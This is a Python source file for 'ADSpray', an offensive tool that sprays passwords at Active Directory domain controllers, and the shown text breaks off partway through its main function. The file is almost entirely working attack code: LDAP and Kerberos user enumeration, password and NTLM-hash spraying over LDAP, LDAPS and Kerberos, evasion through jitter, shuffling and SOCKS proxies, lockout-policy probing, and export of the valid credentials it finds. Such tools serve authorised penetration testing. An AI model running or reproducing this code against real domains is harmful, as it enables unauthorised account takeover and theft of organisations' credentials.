#!/usr/bin/env python3
"""
ADSpray - Active Directory Password Spraying Tool
Author: @ZephrFish
"""

import argparse
import sys
import time
import json
import csv
import random
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple
import socket
import ssl
from enum import Enum
import fnmatch

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SIMPLE
    from ldap3.core.exceptions import LDAPException, LDAPBindError
except ImportError:
    print("[!] ldap3 required: pip install ldap3")
    sys.exit(1)

try:
    import socks
    import socket as socket_module
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[!] PySocks not available, proxy support disabled")

try:
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal
    KERBEROS_AVAILABLE = True
except ImportError:
    KERBEROS_AVAILABLE = False
    print("[!] impacket not available, Kerberos auth disabled")


class AuthMethod(Enum):
    LDAP = "ldap"
    LDAPS = "ldaps"
    LDAP_NTLM = "ldap-ntlm"
    LDAPS_NTLM = "ldaps-ntlm"
    KERBEROS = "kerberos"


class SprayResult:
    def __init__(self, username: str, password: str, success: bool,
                 method: str, message: str = "", timestamp: datetime = None):
        self.username = username
        self.password = password
        self.success = success
        self.method = method
        self.message = message
        self.timestamp = timestamp or datetime.now()

    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "success": self.success,
            "method": self.method,
            "message": self.message,
            "timestamp": self.timestamp.isoformat()
        }


class ADSpray:
    def __init__(self, domain: str, dc_ip: str, method: AuthMethod = AuthMethod.LDAPS,
                 delay: int = 30, jitter: int = 5, lockout_threshold: int = 3,
                 verbose: bool = False, proxy_host: Optional[str] = None,
                 proxy_port: Optional[int] = None, proxy_type: str = "socks5",
                 proxy_username: Optional[str] = None, proxy_password: Optional[str] = None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.method = method
        self.delay = delay
        self.jitter = jitter
        self.lockout_threshold = lockout_threshold
        self.verbose = verbose
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.proxy_type = proxy_type
        self.proxy_username = proxy_username
        self.proxy_password = proxy_password
        self.results: List[SprayResult] = []
        self.attempt_counts: Dict[str, int] = {}

        # Setup proxy if configured
        self._setup_proxy()

    def _setup_proxy(self):
        """Configure SOCKS proxy for all connections"""
        if not self.proxy_host:
            return

        if not SOCKS_AVAILABLE:
            self.log("Proxy configured but PySocks not installed", "ERROR")
            sys.exit(1)

        # Map proxy type string to socks constant
        proxy_types = {
            "socks4": socks.SOCKS4,
            "socks5": socks.SOCKS5,
            "http": socks.HTTP
        }

        proxy_type_const = proxy_types.get(self.proxy_type.lower(), socks.SOCKS5)

        # Set default proxy for socket connections
        socks.set_default_proxy(
            proxy_type_const,
            self.proxy_host,
            self.proxy_port,
            username=self.proxy_username,
            password=self.proxy_password
        )

        # Monkey patch socket to use proxy
        socket.socket = socks.socksocket

        self.log(f"Proxy configured: {self.proxy_type}://{self.proxy_host}:{self.proxy_port}", "INFO")

    def _get_proxy_aware_socket(self):
        """Get a socket configured with proxy settings"""
        if not self.proxy_host or not SOCKS_AVAILABLE:
            return socket.socket

        proxy_types = {
            "socks4": socks.SOCKS4,
            "socks5": socks.SOCKS5,
            "http": socks.HTTP
        }

        proxy_type_const = proxy_types.get(self.proxy_type.lower(), socks.SOCKS5)

        sock = socks.socksocket()
        sock.set_proxy(
            proxy_type_const,
            self.proxy_host,
            self.proxy_port,
            username=self.proxy_username,
            password=self.proxy_password
        )
        return sock

    def log(self, message: str, level: str = "INFO"):
        """Log messages with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "ERROR": "[-]",
            "WARNING": "[!]",
            "DEBUG": "[DEBUG]"
        }.get(level, "[*]")

        if level == "DEBUG" and not self.verbose:
            return

        print(f"{timestamp} {prefix} {message}")

    def read_file(self, filepath: str) -> List[str]:
        """Read lines from file, strip whitespace"""
        try:
            with open(filepath, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log(f"Error reading {filepath}: {e}", "ERROR")
            return []

    def enumerate_users(self, auth_user: str, auth_pass: str,
                       use_ntlm: bool = False, max_users: int = 0) -> List[str]:
        """Enumerate domain users via LDAP query"""
        try:
            use_ssl = self.method in (AuthMethod.LDAPS, AuthMethod.LDAPS_NTLM)
            port = 636 if use_ssl else 389
            server = Server(self.dc_ip, port=port, get_info=ALL, use_ssl=use_ssl)

            # Determine authentication method
            if use_ntlm or self.method in (AuthMethod.LDAP_NTLM, AuthMethod.LDAPS_NTLM):
                # NTLM authentication with domain\user format
                user_dn = f"{self.domain}\\{auth_user}"
                auth_method = NTLM
                self.log(f"Enumerating users with NTLM auth as {user_dn}", "INFO")
            else:
                # Simple authentication with user@domain format
                user_dn = f"{auth_user}@{self.domain}"
                auth_method = SIMPLE
                self.log(f"Enumerating users with SIMPLE auth as {user_dn}", "INFO")

            conn = Connection(server, user=user_dn, password=auth_pass,
                            authentication=auth_method, auto_bind=True)

            search_base = f"DC={',DC='.join(self.domain.split('.'))}"
            search_filter = "(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

            users = []

            # Use paged search to retrieve all users (not limited to 1000)
            if max_users > 0:
                # If max_users specified, use size_limit
                conn.search(
                    search_base=search_base,
                    search_filter=search_filter,
                    attributes=['sAMAccountName'],
                    size_limit=max_users
                )

                for entry in conn.entries:
                    if entry.sAMAccountName:
                        username = str(entry.sAMAccountName)
                        users.append(username)
            else:
                # No limit - use paged search to get ALL users
                page_size = 1000
                cookie = None

                while True:
                    conn.search(
                        search_base=search_base,
                        search_filter=search_filter,
                        attributes=['sAMAccountName'],
                        paged_size=page_size,
                        paged_cookie=cookie
                    )

                    for entry in conn.entries:
                        if entry.sAMAccountName:
                            username = str(entry.sAMAccountName)
                            users.append(username)

                    # Get the cookie for the next page
                    cookie = conn.result['controls']['1.2.840.113556.1.4.319']['value']['cookie']

                    # Log progress for large domains
                    if len(users) % 1000 == 0:
                        self.log(f"Enumerated {len(users)} users so far...", "INFO")

                    # If no cookie, we've retrieved all results
                    if not cookie:
                        break

            conn.unbind()
            self.log(f"Enumerated {len(users)} enabled user accounts", "SUCCESS")
            return sorted(users)

        except Exception as e:
            self.log(f"Failed to enumerate users: {e}", "ERROR")
            return []

    def save_users_to_file(self, users: List[str], filepath: str):
        """Save enumerated users to file"""
        try:
            with open(filepath, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            self.log(f"Saved {len(users)} users to {filepath}", "SUCCESS")
        except Exception as e:
            self.log(f"Error saving users to {filepath}: {e}", "ERROR")

    def enumerate_users_kerb(self, userlist: List[str]) -> List[str]:
        """Validate usernames via Kerberos pre-authentication (no password needed)"""
        if not KERBEROS_AVAILABLE:
            self.log("Kerberos enumeration requires impacket", "ERROR")
            return []

        valid_users = []
        self.log(f"Validating {len(userlist)} users via Kerberos pre-auth...", "INFO")

        for idx, username in enumerate(userlist, 1):
            try:
                # Try to get TGT with dummy password - we only care about the error message
                client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

                try:
                    getKerberosTGT(client, "InvalidPassword123!", self.domain,
                                 self.dc_ip, self.dc_ip, self.dc_ip)
                    # If we get here, the password was actually valid (unlikely with random pass)
                    valid_users.append(username)
                    self.log(f"Valid user (with lucky password!): {username}", "SUCCESS")
                except Exception as e:
                    error_msg = str(e)

                    # KDC_ERR_PREAUTH_FAILED = user exists but password wrong (VALID USER)
                    if "KDC_ERR_PREAUTH_FAILED" in error_msg:
                        valid_users.append(username)
                        self.log(f"Valid user: {username}", "DEBUG")

                    # KDC_ERR_C_PRINCIPAL_UNKNOWN = user doesn't exist (INVALID USER)
                    elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in error_msg:
                        self.log(f"Invalid user: {username}", "DEBUG")

                    # KDC_ERR_CLIENT_REVOKED = account disabled (VALID USER but disabled)
                    elif "KDC_ERR_CLIENT_REVOKED" in error_msg:
                        self.log(f"Valid user (disabled): {username}", "WARNING")
                        # Optionally add disabled users
                        # valid_users.append(username)

                    # KDC_ERR_KEY_EXPIRED = password expired (VALID USER)
                    elif "KDC_ERR_KEY_EXPIRED" in error_msg:
                        valid_users.append(username)
                        self.log(f"Valid user (expired password): {username}", "DEBUG")

                    else:
                        self.log(f"Unknown error for {username}: {error_msg}", "DEBUG")

                # Progress update
                if idx % 10 == 0:
                    self.log(f"Progress: {idx}/{len(userlist)} users validated", "INFO")

            except Exception as e:
                self.log(f"Error checking {username}: {e}", "DEBUG")

        self.log(f"Enumeration complete: {len(valid_users)}/{len(userlist)} valid users", "SUCCESS")
        return valid_users

    def filter_excluded_users(self, usernames: List[str], patterns: List[str]) -> List[str]:
        """Filter out usernames matching exclusion patterns"""
        filtered = []
        for username in usernames:
            username_lower = username.lower()
            excluded = False

            for pattern in patterns:
                # Support wildcard patterns
                if fnmatch.fnmatch(username_lower, pattern.lower()):
                    self.log(f"Excluding {username} (matches pattern: {pattern})", "DEBUG")
                    excluded = True
                    break

            if not excluded:
                filtered.append(username)

        return filtered

    def save_state(self, filepath: str, usernames: List[str], passwords: List[str],
                   current_password_idx: int):
        """Save spray state for resumption"""
        state = {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "method": self.method.value,
            "usernames": usernames,
            "passwords": passwords,
            "current_password_idx": current_password_idx,
            "results": [r.to_dict() for r in self.results],
            "attempt_counts": self.attempt_counts,
            "timestamp": datetime.now().isoformat()
        }

        try:
            with open(filepath, 'w') as f:
                json.dump(state, f, indent=2)
            self.log(f"State saved to {filepath}", "INFO")
        except Exception as e:
            self.log(f"Failed to save state: {e}", "ERROR")

    def load_state(self, filepath: str) -> Optional[Dict]:
        """Load saved spray state"""
        try:
            with open(filepath, 'r') as f:
                state = json.load(f)
            self.log(f"State loaded from {filepath}", "INFO")
            self.log(f"Saved at: {state['timestamp']}", "INFO")
            self.log(f"Progress: {state['current_password_idx']}/{len(state['passwords'])} passwords", "INFO")
            return state
        except Exception as e:
            self.log(f"Failed to load state: {e}", "ERROR")
            return None


    def check_lockout_policy(self, auth_user: Optional[str] = None,
                             auth_pass: Optional[str] = None) -> Optional[Dict]:
        """Attempt to retrieve domain lockout and password policy via LDAP"""
        try:
            use_ssl = self.method == AuthMethod.LDAPS
            port = 636 if use_ssl else 389
            server = Server(self.dc_ip, port=port, get_info=ALL, use_ssl=use_ssl)

            # Try authenticated bind if credentials provided, otherwise anonymous
            if auth_user and auth_pass:
                user_dn = f"{auth_user}@{self.domain}"
                self.log(f"Authenticating as {user_dn} to retrieve policy", "DEBUG")
                conn = Connection(server, user=user_dn, password=auth_pass,
                                authentication=SIMPLE, auto_bind=True)
            else:
                self.log("Using anonymous bind to retrieve policy", "DEBUG")
                conn = Connection(server, auto_bind=True)

            search_base = f"DC={',DC='.join(self.domain.split('.'))}"

            # Request both lockout and password policy attributes
            policy_attributes = [
                'lockoutThreshold', 'lockoutDuration', 'lockOutObservationWindow',
                'minPwdLength', 'minPwdAge', 'maxPwdAge', 'pwdHistoryLength', 'pwdProperties'
            ]

            conn.search(search_base, '(objectClass=domain)', attributes=policy_attributes)

            if conn.entries:
                entry = conn.entries[0]

                # Convert timedelta objects to minutes (AD stores as negative 100-nanosecond intervals)
                def timedelta_to_minutes(value):
                    if value is None:
                        return 0
                    if isinstance(value, timedelta):
                        return abs(int(value.total_seconds() / 60))
                    try:
                        return int(value)
                    except (TypeError, ValueError):
                        return 0

                # Convert timedelta to days for better readability
                def timedelta_to_days(value):
                    if value is None:
                        return 0
                    if isinstance(value, timedelta):
                        return abs(int(value.total_seconds() / 86400))  # 86400 seconds in a day
                    try:
                        return int(value)
                    except (TypeError, ValueError):
                        return 0

                # Safely extract integer values
                def safe_int(value):
                    if value is None:
                        return 0
                    try:
                        return int(value)
                    except (TypeError, ValueError):
                        return 0

                # Build policy dictionary with both lockout and password policies
                policy = {
                    # Lockout policy
                    'lockoutThreshold': safe_int(entry.lockoutThreshold.value if entry.lockoutThreshold else None),
                    'lockoutDuration': timedelta_to_minutes(entry.lockoutDuration.value if entry.lockoutDuration else None),
                    'lockOutObservationWindow': timedelta_to_minutes(entry.lockOutObservationWindow.value if entry.lockOutObservationWindow else None),

                    # Password policy
                    'minPwdLength': safe_int(entry.minPwdLength.value if entry.minPwdLength else None),
                    'minPwdAge': timedelta_to_days(entry.minPwdAge.value if entry.minPwdAge else None),
                    'maxPwdAge': timedelta_to_days(entry.maxPwdAge.value if entry.maxPwdAge else None),
                    'pwdHistoryLength': safe_int(entry.pwdHistoryLength.value if entry.pwdHistoryLength else None),
                    'pwdProperties': safe_int(entry.pwdProperties.value if entry.pwdProperties else None)
                }

                conn.unbind()
                return policy
        except Exception as e:
            self.log(f"Could not retrieve lockout policy: {e}", "WARNING")
        return None

    def try_ldap_auth(self, username: str, password: str, is_hash: bool = False) -> Tuple[bool, str]:
        """Attempt LDAP authentication"""
        try:
            use_ssl = self.method in (AuthMethod.LDAPS, AuthMethod.LDAPS_NTLM)
            port = 636 if use_ssl else 389
            server = Server(self.dc_ip, port=port, use_ssl=use_ssl, get_info=ALL)

            # Determine authentication method and format
            if self.method in (AuthMethod.LDAP_NTLM, AuthMethod.LDAPS_NTLM):
                # NTLM authentication with domain\user format
                user_dn = f"{self.domain}\\{username}"
                auth_method = NTLM

                # For NTLM hash authentication, format as LM:NT
                if is_hash:
                    # Assume password is already in LM:NT or just NT format
                    if ':' not in password:
                        password = f"00000000000000000000000000000000:{password}"
            else:
                # Simple authentication with user@domain format
                user_dn = f"{username}@{self.domain}"
                auth_method = SIMPLE

            conn = Connection(server, user=user_dn, password=password, authentication=auth_method)

            if conn.bind():
                conn.unbind()
                return True, "Authentication successful"
            else:
                return False, str(conn.result)

        except LDAPBindError as e:
            error_msg = str(e)
            if "52e" in error_msg.lower() or "invalid credentials" in error_msg.lower():
                return False, "Invalid credentials"
            elif "775" in error_msg.lower() or "account locked" in error_msg.lower():
                return False, "Account locked"
            elif "532" in error_msg.lower() or "password expired" in error_msg.lower():
                return False, "Password expired (but valid!)"
            elif "533" in error_msg.lower() or "account disabled" in error_msg.lower():
                return False, "Account disabled"
            else:
                return False, f"Bind error: {error_msg}"
        except Exception as e:
            return False, f"Connection error: {str(e)}"

    def try_kerberos_auth(self, username: str, password: str) -> Tuple[bool, str]:
        """Attempt Kerberos pre-authentication"""
        if not KERBEROS_AVAILABLE:
            return False, "Kerberos not available (impacket not installed)"

        try:
            client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                client, password, self.domain,
                self.dc_ip, self.dc_ip, self.dc_ip
            )
            return True, "TGT obtained successfully"
        except Exception as e:
            error_msg = str(e)
            if "KDC_ERR_PREAUTH_FAILED" in error_msg:
                return False, "Invalid credentials"
            elif "KDC_ERR_CLIENT_REVOKED" in error_msg:
                return False, "Account disabled"
            elif "KDC_ERR_KEY_EXPIRED" in error_msg:
                return False, "Password expired (but valid!)"
            else:
                return False, f"Kerberos error: {error_msg}"

    def spray_password(self, username: str, password: str, is_hash: bool = False) -> SprayResult:
        """Attempt authentication with single username/password"""

        # Track attempts per user for lockout avoidance
        self.attempt_counts[username] = self.attempt_counts.get(username, 0) + 1

        if self.attempt_counts[username] > self.lockout_threshold:
            self.log(f"Skipping {username} - lockout threshold reached", "WARNING")
            return SprayResult(username, password, False, self.method.value,
                             "Lockout threshold reached")

        pass_display = password[:2] + '*' * (len(password)-2) if not is_hash else password[:8] + '...'
        self.log(f"Testing {username} with {'hash' if is_hash else 'password'}: {pass_display}", "DEBUG")

        # Try authentication based on method
        if self.method in (AuthMethod.LDAP, AuthMethod.LDAPS, AuthMethod.LDAP_NTLM, AuthMethod.LDAPS_NTLM):
            success, message = self.try_ldap_auth(username, password, is_hash)
        elif self.method == AuthMethod.KERBEROS:
            success, message = self.try_kerberos_auth(username, password)
        else:
            success, message = False, "Unknown authentication method"

        result = SprayResult(username, password, success, self.method.value, message)

        # Log result
        if success or "expired" in message.lower():
            self.log(f"SUCCESS: {username}:{pass_display} - {message}", "SUCCESS")
        else:
            self.log(f"Failed: {username} - {message}", "DEBUG")

        return result

    def spray(self, usernames: List[str], passwords: List[str],
              delay_between_users: bool = True, auth_user: Optional[str] = None,
              auth_pass: Optional[str] = None, is_hash: bool = False,
              stop_on_success: bool = False, randomize: bool = False,
              shuffle_passwords: bool = False, exclude_patterns: Optional[List[str]] = None,
              save_state_file: Optional[str] = None, start_password_idx: int = 0) -> List[SprayResult]:
        """Execute password spray attack"""

        # Apply exclusions
        if exclude_patterns:
            original_count = len(usernames)
            usernames = self.filter_excluded_users(usernames, exclude_patterns)
            excluded_count = original_count - len(usernames)
            if excluded_count > 0:
                self.log(f"Excluded {excluded_count} users matching patterns", "WARNING")

        if not usernames:
            self.log("No users remaining after exclusions", "ERROR")
            return []

        self.log(f"Starting spray against {self.domain} ({self.dc_ip})")
        self.log(f"Method: {self.method.value}, Users: {len(usernames)}, Passwords: {len(passwords)}")
        self.log(f"Delay: {self.delay}s (±{self.jitter}s jitter)")

        if stop_on_success:
            self.log("Stop-on-success mode enabled", "INFO")

        if randomize:
            self.log("User randomization enabled (better OPSEC)", "INFO")

        if shuffle_passwords:
            self.log("Password shuffling enabled", "INFO")
            passwords = passwords.copy()
            random.shuffle(passwords)

        if save_state_file:
            self.log(f"Auto-save enabled: {save_state_file}", "INFO")

        if start_password_idx > 0:
            self.log(f"Resuming from password {start_password_idx + 1}/{len(passwords)}", "INFO")

        # Check lockout policy
        policy = self.check_lockout_policy(auth_user, auth_pass)
        if policy:
            self.log(f"Lockout Policy - Threshold: {policy['lockoutThreshold']}, "
                    f"Duration: {policy['lockoutDuration']} minutes", "INFO")

            if policy['lockoutThreshold'] > 0 and policy['lockoutThreshold'] < len(passwords):
                self.log(f"WARNING: Spraying {len(passwords)} passwords with lockout threshold "
                        f"of {policy['lockoutThreshold']}", "WARNING")

        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0

        # Spray each password against all users (starting from resume point)
        for pwd_idx, password in enumerate(passwords[start_password_idx:], start_password_idx + 1):
            self.log(f"\n{'='*60}")
            self.log(f"Password {pwd_idx}/{len(passwords)}: {password[:2]}{'*' * (len(password)-2)}")
            self.log(f"{'='*60}")

            # Randomize user order for this password if enabled
            current_users = usernames.copy()
            if randomize:
                random.shuffle(current_users)

            for user_idx, username in enumerate(current_users, 1):
                current_attempt += 1

                # Execute spray attempt
                result = self.spray_password(username, password, is_hash)
                self.results.append(result)

                # Check if we should stop on first success
                if stop_on_success and (result.success or "expired" in result.message.lower()):
                    self.log(f"SUCCESS FOUND! Stopping spray as requested.", "SUCCESS")
                    if save_state_file:
                        self.save_state(save_state_file, usernames, passwords, pwd_idx - 1)
                    return self.results

                # Progress indicator
                if user_idx % 10 == 0:
                    self.log(f"Progress: {current_attempt}/{total_attempts} attempts "
                            f"({(current_attempt/total_attempts)*100:.1f}%)")

                # Delay between users if enabled
                if delay_between_users and user_idx < len(current_users):
                    import random
                    sleep_time = self.delay + random.randint(-self.jitter, self.jitter)
                    if sleep_time < 1:
                        sleep_time = 1
                    time.sleep(sleep_time)

            # Save state after each password
            if save_state_file:
                self.save_state(save_state_file, usernames, passwords, pwd_idx)

            # Larger delay between password attempts
            if pwd_idx < len(passwords):
                self.log(f"Completed password {pwd_idx}/{len(passwords)}, waiting before next...")
                delay_time = self.delay * 10  # 10x delay between passwords
                time.sleep(delay_time)

        return self.results

    def get_successful_results(self) -> List[SprayResult]:
        """Return only successful authentication attempts"""
        return [r for r in self.results if r.success or "expired" in r.message.lower()]

    def export_results(self, filepath: str, format: str = "json"):
        """Export results to file"""
        try:
            if format == "json":
                with open(filepath, 'w') as f:
                    json.dump([r.to_dict() for r in self.results], f, indent=2)
            elif format == "csv":
                with open(filepath, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=['timestamp', 'username', 'password',
                                                           'success', 'method', 'message'])
                    writer.writeheader()
                    writer.writerows([r.to_dict() for r in self.results])
            elif format == "txt":
                with open(filepath, 'w') as f:
                    f.write("ADSpray Results\n")
                    f.write("="*60 + "\n\n")
                    for r in self.get_successful_results():
                        f.write(f"{r.username}:{r.password} - {r.message}\n")

            self.log(f"Results exported to {filepath}", "SUCCESS")
        except Exception as e:
            self.log(f"Error exporting results: {e}", "ERROR")

    def print_summary(self):
        """Print summary of spray results"""
        successful = self.get_successful_results()

        print("\n" + "="*60)
        print("SPRAY SUMMARY")
        print("="*60)
        print(f"Total attempts: {len(self.results)}")
        print(f"Successful authentications: {len(successful)}")
        print(f"Success rate: {(len(successful)/len(self.results)*100):.2f}%")

        if successful:
            print("\n" + "-"*60)
            print("VALID CREDENTIALS:")
            print("-"*60)
            for result in successful:
                print(f"  {result.username}:{result.password} - {result.message}")
        print("="*60 + "\n")


def main():
    banner = """
    ╔═══════════════════════════════════════╗
    ║          ADSpray v1.0                 ║
    ║   Active Directory Password Spray     ║
    ╚═══════════════════════════════════════╝
    """
    print(banner)

    parser = argparse.ArgumentParser(
        description="Active Directory Password Spraying Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic LDAPS spray
  python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt

  # Kerberos spray with custom timing
  python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -p passwords.txt \\
    --method kerberos --delay 60 --jitter 10

  # Single password spray with output
  python adspray.py -d contoso.com -dc 192.168.1.10 -u users.txt -P "Summer2024!" \\
    -o results.json --format json
        """
    )

    # Required arguments
    parser.add_argument("-d", "--domain", required=True, help="Target domain (e.g., contoso.com)")
    parser.add_argument("-dc", "--domain-controller", required=True, help="Domain controller IP")

    # User/password input
    user_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument("-u", "--userlist", help="File containing usernames (one per line)")
    user_group.add_argument("-U", "--username", help="Single username to test")

    pass_group = parser.add_mutually_exclusive_group(required=False)
    pass_group.add_argument("-p", "--passlist", help="File containing passwords (one per line)")
    pass_group.add_argument("-P", "--password", help="Single password to test")

    # Authentication options
    parser.add_argument("--method", choices=["ldap", "ldaps", "ldap-ntlm", "ldaps-ntlm", "kerberos"],
                       default="ldaps", help="Authentication method (default: ldaps)")

    # Timing options
    parser.add_argument("--delay", type=int, default=30,
                       help="Delay between attempts in seconds (default: 30)")
    parser.add_argument("--jitter", type=int, default=5,
                       help="Random jitter to add/subtract from delay (default: 5)")
    parser.add_argument("--lockout-threshold", type=int, default=3,
                       help="Stop trying user after N failures (default: 3)")

    # Proxy options
    parser.add_argument("--proxy", help="SOCKS proxy (e.g., 127.0.0.1:1080)")
    parser.add_argument("--proxy-type", choices=["socks4", "socks5", "http"],
                       default="socks5", help="Proxy type (default: socks5)")
    parser.add_argument("--proxy-username", help="Proxy authentication username")
    parser.add_argument("--proxy-password", help="Proxy authentication password")

    # Domain authentication options
    parser.add_argument("--auth-user", help="Domain username for authenticated operations")
    parser.add_argument("--auth-pass", help="Domain password for authenticated operations")

    # User enumeration options
    parser.add_argument("--enum-users", action="store_true",
                       help="Enumerate all users from AD (requires --auth-user/--auth-pass)")
    parser.add_argument("--enum-output", help="Save enumerated users to file")
    parser.add_argument("--validate-users", action="store_true",
                       help="Validate users via Kerberos before spraying")
    parser.add_argument("--max-users", type=int, default=0,
                       help="Maximum users to enumerate (0 = all)")

    # Hash and spray options
    parser.add_argument("--ntlm", action="store_true",
                       help="Passwords/hashes are NTLM format")
    parser.add_argument("--stop-on-success", action="store_true",
                       help="Stop spray after first valid credential")

    # OPSEC and filtering options
    parser.add_argument("--randomize", action="store_true",
                       help="Randomize user order for each password (better OPSEC)")
    parser.add_argument("--shuffle-passwords", action="store_true",
                       help="Shuffle password order before spraying")
    parser.add_argument("--exclude", help="File containing usernames to exclude (one per line)")
    parser.add_argument("--exclude-pattern", help="Comma-separated patterns to exclude (e.g., '*admin*,*svc*')")

    # Resume capability
    parser.add_argument("--save-state", help="Auto-save spray state to file after each password")
    parser.add_argument("--resume", help="Resume spray from saved state file")

    # Policy check option
    parser.add_argument("--policy-check", action="store_true",
                       help="Only check lockout policy, don't spray")

    # Output options
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("--format", choices=["json", "csv", "txt"], default="json",
                       help="Output format (default: json)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    # Handle --ntlm flag: adjust method if needed
    if args.ntlm and args.method in ["ldap", "ldaps"]:
        args.method = f"{args.method}-ntlm"
        method = AuthMethod(args.method)
    else:
        method = AuthMethod(args.method)

    # Validate that policy-check/enum-users doesn't require user/pass, but spray does
    if not args.policy_check and not args.enum_users and not ((args.userlist or args.username) and (args.passlist or args.password)):
        parser.error("Spray mode requires -u/--userlist or -U/--username AND -p/--passlist or -P/--password")

    # Validate enum-users or policy-check has auth credentials (recommended for better results)
    if (args.enum_users or args.policy_check) and not (args.auth_user and args.auth_pass):
        print("[!] Warning: --enum-users and --policy-check work best with --auth-user and --auth-pass")
        print("[!] Attempting anonymous bind (may have limited results)...")

    # Must have auth for enum-users (required)
    if args.enum_users and not (args.auth_user and args.auth_pass):
        parser.error("--enum-users requires --auth-user and --auth-pass")

    # Parse proxy if provided
    proxy_host = None
    proxy_port = None
    if args.proxy:
        try:
            proxy_parts = args.proxy.split(":")
            proxy_host = proxy_parts[0]
            proxy_port = int(proxy_parts[1])
        except (IndexError, ValueError):
            print("[-] Invalid proxy format. Use host:port (e.g., 127.0.0.1:1080)")
            sys.exit(1)

    # Load users and passwords (not needed for policy-check only)
    users = []
    passwords = []
    start_password_idx = 0

    # Handle resume mode
    if args.resume:
        sprayer_temp = ADSpray(args.domain, args.domain_controller, method=method)
        state = sprayer_temp.load_state(args.resume)

        if state:
            users = state['usernames']
            passwords = state['passwords']
            start_password_idx = state['current_password_idx'] + 1

            # Restore results and attempt counts
            for r_dict in state['results']:
                sprayer_temp.results.append(SprayResult(
                    r_dict['username'], r_dict['password'], r_dict['success'],
                    r_dict['method'], r_dict['message']
                ))
            sprayer_temp.attempt_counts = state['attempt_counts']

            print(f"[+] Resuming spray from password {start_password_idx + 1}/{len(passwords)}")
            print(f"[+] Loaded {len(state['results'])} previous results")
        else:
            print("[-] Failed to load state file")
            sys.exit(1)

    elif not args.policy_check and not args.enum_users:
        if args.userlist:
            sprayer_temp = ADSpray(args.domain, args.domain_controller)
            users = sprayer_temp.read_file(args.userlist)
            if not users:
                print("[-] No users loaded from file")
                sys.exit(1)
        else:
            users = [args.username]

        if args.passlist:
            sprayer_temp = ADSpray(args.domain, args.domain_controller)
            passwords = sprayer_temp.read_file(args.passlist)
            if not passwords:
                print("[-] No passwords loaded from file")
                sys.exit(1)
        else:
            passwords = [args.password]

    # Convert method string to enum (already done above for --ntlm handling)
    # method = AuthMethod(args.method)

    # Check Kerberos availability
    if method == AuthMethod.KERBEROS and not KERBEROS_AVAILABLE:
        print("[-] Kerberos method requires impacket: pip install impacket")
        sys.exit(1)

    # Initialize sprayer
    sprayer = ADSpray(
        domain=args.domain,
        dc_ip=args.domain_controller,
        method=method,
        delay=args.delay,
        jitter=args.jitter,
        lockout_threshold=args.lockout_threshold,
        verbose=args.verbose,
        proxy_host=proxy_host,
        proxy_port=proxy_port,
        proxy_type=args.proxy_type,
        proxy_username=args.proxy_username,
        proxy_password=args.proxy_password
    )

    try:
        # User enumeration mode
        if args.enum_users:
            print("\n[*] Enumerating domain users...")
            users_enumerated = sprayer.enumerate_users(
                args.auth_user, args.auth_pass,
                use_ntlm=args.ntlm, max_users=args.max_users
            )

            if users_enumerated:
                print(f"\n[+] Found {len(users_enumerated)} enabled users")
                if args.enum_output:
                    sprayer.save_users_to_file(users_enumerated, args.enum_output)
                else:
                    print("\nUsers:")
                    for user in users_enumerated[:20]:  # Show first 20
                        print(f"  - {user}")
                    if len(users_enumerated) > 20:
                        print(f"  ... and {len(users_enumerated) - 20} more")

                # If only enum-users (no policy check or spray), exit here
                if not args.policy_check and not (args.userlist or args.username):
                    sys.exit(0)
                # Otherwise, update users list for potential spray
                if not args.userlist and not args.username:
                    users = users_enumerated
            else:
                print("[-] No users enumerated")
                # Only exit if this was the only operation requested
                if not args.policy_check:
                    sys.exit(1)

        # Validate users via Kerberos if requested
        if args.validate_users and users:
            print("\n[*] Validating users via Kerberos...")
            valid_users = sprayer.enumerate_users_kerb(users)
            print(f"[+] {len(valid_users)}/{len(users)} users are valid")
            users = valid_users

            if not users:
                print("[-] No valid users remaining after validation")
                sys.exit(1)

        # Load exclusions
        exclude_patterns = []
        if args.exclude:
            sprayer_temp = ADSpray(args.domain, args.domain_controller)
            exclude_list = sprayer_temp.read_file(args.exclude)
            exclude_patterns.extend(exclude_list)

        if args.exclude_pattern:
            patterns = [p.strip() for p in args.exclude_pattern.split(',')]
            exclude_patterns.extend(patterns)

        # Policy check mode
        if args.policy_check:
            print("\n[*] Checking domain lockout and password policy...")
            policy = sprayer.check_lockout_policy(args.auth_user, args.auth_pass)
            if policy:
                print("\n" + "="*60)
                print("DOMAIN LOCKOUT POLICY")
                print("="*60)
                print(f"Lockout Threshold:        {policy['lockoutThreshold']} failed attempts")
                print(f"Lockout Duration:         {policy['lockoutDuration']} minutes")
                print(f"Observation Window:       {policy['lockOutObservationWindow']} minutes")
                print("="*60)

                print("\n" + "="*60)
                print("DOMAIN PASSWORD POLICY")
                print("="*60)
                print(f"Minimum Password Length:  {policy['minPwdLength']} characters")
                print(f"Password History Length:  {policy['pwdHistoryLength']} passwords remembered")
                print(f"Minimum Password Age:     {policy['minPwdAge']} days")

